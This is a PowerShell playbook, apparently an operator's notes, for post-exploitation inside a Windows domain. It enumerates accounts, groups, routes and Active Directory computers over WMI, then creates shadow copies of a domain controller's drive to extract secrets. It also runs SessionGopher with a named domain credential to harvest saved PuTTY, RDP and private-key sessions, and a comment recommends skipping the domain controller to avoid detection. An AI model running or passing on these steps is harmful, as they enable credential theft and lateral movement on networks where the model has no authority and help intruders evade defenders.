<#
Gathering information from the box using WMI which is an effective stealthy tool
How to maximise leverage cmd presence via WMI
Fork Arvanaghi SessionGropher 
The above is a tool written by Brandon Arvanaghi which grabs sessions and saved sessions for puTTY boxes rdp sessions etc
EXTREMELY USEFUL - SessionGOPHER tool
#>
#Listing classes to look for useful stuff
Get-WmiObject -Class *Win32_IP* -List

#Listing useful information about route tables
Get-WmiObject -Class Win32_IP4RouteTable | Select-Object -Property Description,Mask

#Let's have a look at the local accounts,domains, trusted domains etc 
#Users for not just the current box , but the current domain, and domains which have bidirectional trust with our current domain
Get-WmiObject -Class Win32_UserAccount

#Local domain, trusted domains, and trusted forest is also revealed
Get-WmiObject -Class Win32_Group

#We have escalated privileges
#Use win32_shadow copy of the C drive of domain controller. Keys to the kingdom? Copying C drive of the domain controller
#Needs admin privileges on the box
#Can be used to extract system secrets
Get-WmiObject -Class win32_shadowcopy

#Lookup basic commands in case you forget syntax of wmql
Get-WmiObject -Class Win32_ShadowCopy -List | Select -ExpandProperty Methods | where Name -eq Create


<#
Using Admin jump boxes as jump points
These are saved session informations 
SessionGopher is an important tool that helps in doing effective active directory enumeration
#>


#Active Directory Enumeration:
#Be careful about sending invasive and excessive queries to the domain contorller.
<#
For active directory namespace (root/directory/ldap) we will see two kinds of classes
Ones which begin with ds_ and the others that begin with as_
The ones which begin with as_ are abstract and cannot be instantiated.

#>
#Lot of interesting properties and methods of the class will pop up
Get-WmiObject -Namespace root/directory/ldap -Class ds_domain

#Let us look at the domain controller for the current box
Get-WmiObject -Namespace root/directory/ldap -Class ds_domain | Select -ExpandProperty ds_dc

Get-WmiObject -Namespace root/directory/ldap -Class ds_computer

#Too many properties, let us look at the non-empty properties of the GCOM-PC01 machine
(Get-WmiObject -Namespace root/directory/ldap -Class ds_computer | Where-Object {$_.ds_cn -eq
 "GCOM-PC01" }).Properties | Foreach-Object {If($_.value -AND $_.name -notmatch "__"){@{$($_.name)=$($_.value)}}}


#Some sample session Gopher command you can run (Use )
Invoke-SessionGopher -Verbose
Invoke-SessionGopher -ComputerName 10.10.0.3 -Credential GCOM\ysingh

Invoke-SessionGopher -ComputerName 10.10.0.3 -Credential GCOM\ysingh -AllDomain

#Leave out the DC domain to avoid detection
Invoke-SessionGopher -ComputerName 10.10.0.3 -Credential GCOM\ysingh -AllDomain -ExcludeDC 

#When this mode is used ,box is searched for Putty .ppk files, RDP files (.rdp), RSA (.stdid)
Invoke-SessionGopher -Thorough




